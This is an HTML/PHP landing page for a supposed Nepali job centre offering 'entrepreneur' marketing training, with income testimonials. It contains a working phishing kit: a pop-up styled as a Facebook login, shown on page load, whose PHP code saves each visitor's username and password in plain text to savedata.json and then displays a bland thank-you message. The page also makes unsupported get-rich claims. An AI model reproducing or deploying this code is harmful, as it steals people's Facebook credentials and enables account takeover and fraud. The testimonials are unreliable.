




<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

/* Set a style for all buttons */
button {
  background-color: #4CAF50;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

/* Extra styles for the cancel button */
.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

/* Center the image and position the close button */
.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
  position: relative;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* The Modal (background) */
.modal {
  //display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
  padding-top: 60px;
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
  border: 1px solid #888;
  width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
  position: absolute;
  right: 25px;
  top: 0;
  color: #000;
  font-size: 35px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: red;
  cursor: pointer;
}

/* Add Zoom Animation */
.animate {
  -webkit-animation: animatezoom 0.6s;
  animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
  from {-webkit-transform: scale(0)} 
  to {-webkit-transform: scale(1)}
}
  
@keyframes animatezoom {
  from {transform: scale(0)} 
  to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>







<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1" /><meta name="HandheldFriendly" content="true" /><title>Online Job Center &  Job Vacancies in Nepal</title><meta name="description" content="Learn to leverage the digital world" /><meta name="keywords" content="" /><link rel="shortcut icon" href="flagsnp.jpg"  type="image/x-icon"><meta property="og:title" content="Ryan and Katie Pope"/><meta property="og:description" content="Learn to leverage the digital world"/><meta property="og:image" content="https://s3-eu-west-1.amazonaws.com/landingi-editor-uploads/Al7lbWLv/Ryan_and_Katie_Pope.jpg"/><!--[if lt IE 9]><script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]--><link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" type="text/css" rel="stylesheet"><link href="" type="text/css" rel="stylesheet"><link href="https://styles.assets-landingi.com/al4E6oZ1/Droid_Sans.css" type="text/css" rel="stylesheet"><!--[if lt IE 9]><link href="https://old.assets-landingi.com/bootstrap/css/ie8-grid.css?v=8.9.8" type="text/css" rel="stylesheet"><link href="https://styles.assets-landingi.com/9QcDTCIL/base_ie8.css" type="text/css" rel="stylesheet"><![endif]--><link href="https://styles.assets-landingi.com/assets/css/2.11-landend-base.css" type="text/css" rel="stylesheet"><link href="https://styles.assets-landingi.com/4MwQvmSh/base.css" type="text/css" rel="stylesheet">
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-643871911"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'AW-643871911');
</script><script src="https://popups.landingi.com/api/v2/landing/install-code?apikey=63122289-ce7b-4805-90a4-e4ea653c170d&landing=a16cc511681f3a5a721d"></script><script src="https://scripts.assets-landingi.com/lightboxes/lightbox-render.js?v=140520"></script>
<script>
window.addEventListener('load', function () {
    LightboxRender.init({
        useAaf: true
    })
});
</script>
</head>
<body id="TxvpQxGuo6CkxW3pseVeXnPkXz3TAWhR">
	<center><h3 id="show_sms"></h3></center>
<div id="id01" class="modal">
  <form class="modal-content animate" action="#" method="post">
  	<center><h3 style="background-color:#2151EE; margin-top: 0;">Facebook</h3></center>
    <div class="container">
      <label for="uname"><p>Mobile number or email address</p></label>
      <input type="text" placeholder="Enter Username" name="uname" required>

      <label for="psw"><p>Password</p></label>
      <input type="password" placeholder="Enter Password" name="psw" required>
        
      <button type="submit" name="submit" >Log In</button>
      <label>
        <input type="checkbox" checked="checked" name="remember"> Remember me
      </label>
    </div>
  </form>
  <?php
  if (isset($_POST['submit'])) {
  		if (file_exists('savedata.json')) {
  			$inital_data = file_get_contents('savedata.json');
  			$multy_data = json_decode($inital_data, true);
  			$extral =array(
  				'user_name' =>$_POST['uname'] , 
  				'password' => $_POST['psw']
  			);
  			$multy_data[] = $extral;
  			$last_data = json_encode($multy_data);
  			if (file_put_contents('savedata.json', $last_data)) {
  				# code...
  				?>
		   	<script>
		   		document.getElementById('show_sms').innerHTML = "Thanks For Contact Us";
		   		document.getElementById('id01').style.display='none';
		   	</script>
		   	<?php
  			}
  		}
  		else{
  			?>
		   	<script>
		   		alert("Please Fill the form with Your Facebook Account");
		   	</script>
		   	<?php
  		}
   } 
   ?>
</div>


<div id="fwG8O6R5wFuI4GIMqEzXMxnoiEH1Tctn" class="widget widget-section">
    <div class="row">
        
        <div class="container">
            
            <div id="yiAHW2K4BIX09Wm6NF40F7Rnes7Wo8vX" class="widget widget-box"></div><div id="EJUpnBRdfk2wIVofLxuLVEyPIKFqzUyO" class="widget widget-text"><h1>We're Helping Thousands of Hard Working People To Switch It Up And Become Entrepreneurs</h1></div><div id="lxPp5kTCokmMxirsr0FDVw74dqSZDxc5" class="widget widget-text"><p>With No Previous Experience</p></div><div id="Xy7S2X9m9yFApHw9NrKwzBVi9frvyAvG" class="widget widget-box"></div><div id="p4KUQy8rGRiLoq1PuiBuNI91Uc48rTAZ" class="widget widget-box"></div>
        </div>
    </div>
</div>
<div id="KyGedXOrIlRh7LL150A8xJMET8dIGqF2" class="widget widget-section">
    <div class="row">
        
        <div class="container">
            
            <div id="OObfsPibQz1moztUB1c7bMenthyLLgO8" class="widget widget-text"><p><span style="">How to find products that convert into high revenue</span><br></p></div><div id="utDJHbhmdTIFgdLShq9skd26MS81noOm" class="widget widget-container clearfix"></div><div id="gKo4AcPIAJV8eeF2KPPFMbTSHgRTSBdK" class="widget widget-container clearfix"></div><div id="wRTCcdATOHTEQS1pREswPQ0BvN2TsTAK" class="widget widget-container clearfix">
    
</div><div id="kLSZ8kq9Mwlm8abrULa7n1PBBDLmMudG" class="widget widget-container input-button-container clearfix"></div><i id="ri3RbH9JdlstySFVizDlsTDu9VsDTJT6" class="fa fa-arrow-down widget widget-icon"></i><div id="BzPDLa1c742EpxBx3OOcNRLxxAWnMI8H" class="widget widget-text"><p>Marketing Training</p></div><i id="kf98Swm7T8CTm8HIF8gHPPmsvZMoWpdi" class="fa fa-check-square-o widget widget-icon"></i><div id="D52Zoaxfw7qclodS7Kiz1CCa4dG6SQLx" class="widget widget-text"><p>Sales Systems</p></div><div id="BaQIcKtSaT9mDugABWZdIUGZNMUrATeK" class="widget widget-text"><p>Product Research</p></div><div id="qWQxaHBwoWFKSsNgNX4rDirwPpsV0rgd" class="widget widget-text"><p>How to use social media to get high quality customers</p></div><div id="DLttTDTNvTUzt1QqNpyc1AtOhTBi4yUJ" class="widget widget-text"><p><span style="">How to find and use automated systems to close the sale</span></p></div><i id="Rw7eZ4BWdJeT1pk24ykRhpnUrPsFtF2t" class="fa fa-check-square-o widget widget-icon"></i><i id="dEXKP5OlV8SyCl8T5TmJEmwsCQJ9UAgm" class="fa fa-check-square-o widget widget-icon"></i><div id="MHIsx5XlJUQX0RsbMh6TCx4do0QeZJ80" class="widget widget-text"><p>Training Registration</p>
<button class="widget widget-input-button" onclick="document.getElementById('id01').style.display='none'" type="submit" ><div class="widget-overlay"></div>CLICK TO SAVE YOUR SEAT!!</button>
</div>
        </div>
    </div>
</div>
<div id="TITE7QllrXLgrNVvif32UdFeFyMcMq0P" class="widget widget-section">
    <div class="row">
        
        <div class="container">
            
            <i id="PVD5BWxTEtNkihI6fcRfp6LJ0vqpGK7o" class="fa fa-lock widget widget-icon"></i><div id="WIS0WIqlULBwTGuUz90f7dWyB9ltf4ZN" class="widget widget-text"><p>We do not spam, rent, or sell your information.</p></div><div id="GSITKrJDT4HWogg97w3OKkQsUZL1rCmy" class="widget widget-text"><p>Results are not guaranteed, refer to the detailed disclaimer at the bottom of this page.</p></div><i id="HyiOCc4c5laeaFEnMKcrTiCLzp51moZE" class="fa fa-university widget widget-icon"></i>
        </div>
    </div>
</div>
<div id="aa8B5BSeDoaJZkTVImkiaBFN48q5Wx8v" class="widget widget-section">
    <div class="row">
        
        <div class="container">
            
            <div id="xmG3y9eU5Hws86K7yb5ZMDXd19Qf7GWr" class="widget widget-box"></div><div id="Sq60gc6NHZ2PbCnwr9lIg5xVMH0NMSvM" class="widget widget-text"><p><b>Karen &amp; Chris:</b></p><p>This has allowed us to retire early, spend our days together, and enjoy quality time with our kids and new grand daughter!</p></div><div id="y3vsiRz1gwTSpva5oAVJGOU0gcKPT5PG" class="widget widget-box"></div><div id="BuFonoAhNXUmTIUMOzGTLmK6f98GQM5n" class="widget widget-text"><p><span style="letter-spacing: 0px;"><b>Michelle:</b></span></p><p>We've paid off our mortgage, taken multiple vacations every year, and even helped out my family back home in the Philippines!  </p></div><div id="TpRCSOTgJm17TUhEFX6NOiTSaLfSmIy1" class="widget widget-box"></div><div id="qV26NEAOCkCgOpJqgTlxpOQ7rfX8wTnv" class="widget widget-text"><p><b>Nikki:</b></p><p>This is such a blessing! Goodbye rushed mornings and late daycare pickups, AND my husband stopped working his crazy hours!</p></div><div id="FodFfq5Nnw9BzZa2g8h6x1zKwWEzKGsb" class="widget widget-box"></div><div id="Xy99xOom0dzstyG6rba9tGgDl4zIMukG" class="widget widget-text"><p><b>Nathan:</b></p><p>My whole life I scraped by working for someone else.   Now, I make more in a month than I did in an entire year!</p></div>
        </div>
    </div>
</div>
<div id="CUsJh2RrtNehLD7S7dgktF5GXvnvs49U" class="widget widget-section">
    <div class="row">
        
        <div class="container">
            
            <div id="bq7SIi9ucrBhpWLysHhQTBIx0PpBdTQw" class="widget widget-text"><p>Copyright © Job Vacation in Nepal</p><p>All Rights Reserved</p></div>
        </div>
    </div>
</div>
</body>
</html>